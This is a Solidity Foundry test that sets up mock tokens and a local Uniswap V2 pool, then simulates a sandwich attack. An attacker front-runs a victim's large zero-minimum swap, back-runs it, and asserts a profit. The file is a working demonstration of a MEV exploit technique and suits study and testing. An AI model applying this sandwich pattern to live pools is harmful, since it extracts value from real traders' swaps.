contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address attacker = address(this);

    // Declare variables that are used in multiple functions
    MockToken public tokenA;
    MockWETH public weth;
    UniswapV2Factory public factory;
    UniswapV2Router02 public router;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create test tokens
        tokenA = new MockToken("Test Token", "TT", 18);
        weth = new MockWETH();

        // Create Uniswap factory and router
        factory = new UniswapV2Factory(address(this));
        router = new UniswapV2Router02(address(factory), address(weth));

        // Create pair
        factory.createPair(address(tokenA), address(weth));
        address pair = factory.getPair(address(tokenA), address(weth));

        // Add liquidity: 100 ETH + 1000 tokens
        uint256 liquidityAmount = 1000 * 10**18;
        tokenA.mint(address(this), liquidityAmount * 10); // Extra for swaps
        deal(address(this), 1000 ether);

        // Approve tokens for router
        tokenA.approve(address(router), type(uint256).max);
        weth.approve(address(router), type(uint256).max);

        // Add liquidity
        router.addLiquidityETH{value: 100 ether}(
            address(tokenA),
            liquidityAmount,
            0,
            0,
            address(this),
            block.timestamp + 1000
        );

        // Label addresses for debugging
        vm.label(address(tokenA), "TestToken");
        vm.label(address(weth), "WETH");
        vm.label(address(router), "UniswapRouter");
        vm.label(pair, "UniswapPair");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial ETH balance
        uint256 initialETH = address(this).balance;

        // Simulate victim's large swap (will move price significantly)
        // Victim wants to swap 50 ETH for tokens
        uint256 victimAmount = 50 ether;

        // Attacker front-run: buy tokens before victim (small amount to not move price much)
        uint256 frontRunAmount = 5 ether;
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(tokenA);

        // Get expected output for front-run
        uint256[] memory amountsOut = router.getAmountsOut(frontRunAmount, path);
        uint256 minOutFront = amountsOut[1] * 99 / 100; // 1% slippage

        // Execute front-run swap
        router.swapExactETHForTokens{value: frontRunAmount}(
            minOutFront,
            path,
            address(this),
            block.timestamp + 1000
        );

        // Record token balance after front-run
        uint256 tokenBalance = tokenA.balanceOf(address(this));

        // Victim executes large swap (simulate by directly calling router as another address)
        address victim = address(0x123);
        deal(victim, victimAmount);
        vm.prank(victim);
        router.swapExactETHForTokens{value: victimAmount}(
            0, // Accept any output
            path,
            victim,
            block.timestamp + 1000
        );

        // Attacker back-run: sell tokens after price increased
        // Prepare reverse path
        address[] memory reversePath = new address[](2);
        reversePath[0] = address(tokenA);
        reversePath[1] = address(weth);

        // Approve router to spend tokens
        tokenA.approve(address(router), tokenBalance);

        // Get expected output for back-run
        amountsOut = router.getAmountsOut(tokenBalance, reversePath);
        uint256 minOutBack = amountsOut[1] * 99 / 100; // 1% slippage

        // Execute back-run swap
        router.swapExactTokensForETH(
            tokenBalance,
            minOutBack,
            reversePath,
            address(this),
            block.timestamp + 1000
        );

        // Verify profit
        uint256 finalETH = address(this).balance;
        assertGt(finalETH, initialETH, "Attacker should have profit in ETH");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
